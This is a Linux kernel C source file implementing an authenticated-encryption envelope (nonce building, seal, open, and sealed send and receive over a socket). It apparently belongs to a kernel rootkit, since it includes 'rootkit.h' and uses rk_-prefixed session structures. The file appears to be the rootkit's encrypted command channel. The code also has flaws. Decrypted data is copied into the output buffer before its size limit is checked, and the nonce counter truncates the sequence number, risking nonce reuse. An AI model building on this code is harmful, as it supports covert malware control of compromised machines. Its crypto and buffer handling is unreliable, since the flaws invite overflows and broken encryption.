// SPDX-License-Identifier: GPL-2.0
// crypto/envelope.c - AEAD envelope: seal, open, nonce construction.
#include <crypto/aead.h>
#include <crypto/gcm.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include "rootkit.h"

static void build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
{
	__be64 sid = cpu_to_be64(session_id);
	__be32 counter = cpu_to_be32((u32)((seq << 1) | (direction == RK_DIR_SERVER)));

	memcpy(nonce, &sid, 8);
	memcpy(nonce + 8, &counter, 4);
}

static int aead_seal(struct crypto_aead *tfm, const u8 *nonce,
	const u8 *aad, size_t aad_len, const u8 *plaintext, size_t pt_len,
	u8 *out, size_t *out_len)
{
	struct aead_request *req;
	struct scatterlist sg;
	u8 *buf;
	int error;

	buf = kmalloc(aad_len + pt_len + RK_TAG_LEN, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (aad_len)
		memcpy(buf, aad, aad_len);
	memcpy(buf + aad_len, plaintext, pt_len);

	sg_init_one(&sg, buf, aad_len + pt_len + RK_TAG_LEN);

	req = aead_request_alloc(tfm, GFP_KERNEL);
	if (!req) {
		kfree(buf);
		return -ENOMEM;
	}

	aead_request_set_crypt(req, &sg, &sg, pt_len, (u8 *)nonce);
	aead_request_set_ad(req, aad_len);

	error = crypto_aead_encrypt(req);
	if (!error) {
		memcpy(out, buf, aad_len + pt_len + RK_TAG_LEN);
		*out_len = aad_len + pt_len + RK_TAG_LEN;
	}

	aead_request_free(req);
	kfree(buf);
	return error;
}

static int aead_open(struct crypto_aead *tfm, const u8 *nonce,
	const u8 *aad, size_t aad_len, const u8 *ct_with_aad, size_t total_len,
	u8 *out, size_t *out_len)
{
	struct aead_request *req;
	struct scatterlist sg;
	u8 *buf;
	size_t ct_plus_tag;
	int error;

	if (total_len < aad_len + RK_TAG_LEN)
		return -EINVAL;

	ct_plus_tag = total_len - aad_len;

	buf = kmalloc(total_len, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	memcpy(buf, ct_with_aad, total_len);
	sg_init_one(&sg, buf, total_len);

	req = aead_request_alloc(tfm, GFP_KERNEL);
	if (!req) {
		kfree(buf);
		return -ENOMEM;
	}

	aead_request_set_crypt(req, &sg, &sg, ct_plus_tag, (u8 *)nonce);
	aead_request_set_ad(req, aad_len);

	error = crypto_aead_decrypt(req);
	if (!error) {
		*out_len = ct_plus_tag - RK_TAG_LEN;
		memcpy(out, buf + aad_len, *out_len);
	}

	aead_request_free(req);
	kfree(buf);
	return error;
}

int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len)
{
	struct rk_envelope_hdr hdr;
	u8 nonce[RK_NONCE_LEN];
	u8 *sealed;
	size_t sealed_len, env_len;
	int error;

	hdr.version = 1;
	hdr.direction = RK_DIR_SERVER;
	hdr.session_id = cpu_to_be64(s->session_id);
	hdr.sequence = cpu_to_be64(s->tx_seq);

	build_nonce(nonce, s->session_id, RK_DIR_SERVER, s->tx_seq);

	env_len = RK_HDR_LEN + len + RK_TAG_LEN;
	sealed = kmalloc(env_len, GFP_KERNEL);
	if (!sealed)
		return -ENOMEM;

	error = aead_seal(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
			  data, len, sealed, &sealed_len);
	if (error) {
		kfree(sealed);
		return error;
	}

	error = rk_send_frame(s->sock, sealed, sealed_len);
	kfree(sealed);
	if (error < 0)
		return error;

	s->tx_seq++;
	return 0;
}

int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len)
{
	u8 *frame;
	size_t frame_len;
	struct rk_envelope_hdr hdr;
	u8 nonce[RK_NONCE_LEN];
	u64 seq;
	int error;

	frame = kmalloc(RK_FRAME_MAX, GFP_KERNEL);
	if (!frame)
		return -ENOMEM;

	error = rk_recv_frame(s->sock, frame, RK_FRAME_MAX, &frame_len);
	if (error)
		goto out_free;

	if (frame_len < RK_HDR_LEN + RK_TAG_LEN) {
		error = -EINVAL;
		goto out_free;
	}

	memcpy(&hdr, frame, RK_HDR_LEN);
	seq = be64_to_cpu(hdr.sequence);

	if (be64_to_cpu(hdr.session_id) != s->session_id ||
	    seq < s->rx_seq_expected) {
		error = -EPROTO;
		goto out_free;
	}

	build_nonce(nonce, s->session_id, hdr.direction, seq);

	error = aead_open(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
			  frame, frame_len, out, out_len);
	if (error)
		goto out_free;

	if (*out_len > max_len) {
		error = -EMSGSIZE;
		goto out_free;
	}

	s->rx_seq_expected = seq + 1;

out_free:
	kfree(frame);
	return error;
}
